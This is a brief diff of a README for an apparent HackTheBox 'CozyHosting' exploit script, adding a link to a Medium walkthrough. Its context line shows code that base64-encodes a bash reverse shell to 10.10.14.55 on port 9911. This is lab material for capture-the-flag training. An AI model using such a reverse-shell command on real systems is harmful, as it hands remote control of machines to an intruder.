@@ -21,7 +21,7 @@ encoded=os.system("echo 'bash -i >& /dev/tcp/10.10.14.55/9911 0>&1'| base64 -w 0
  python3 cozyhosting.py
  ```
 
-To better understand the process, [visit my walkthrough on medium]()
+To better understand the process, [visit my walkthrough on medium](https://k4713.medium.com/k4713-on-cozyhosting-hackthebox-walkthrough-ed7f949c4ac7)
 
 
 ### Happy Hacking :-)
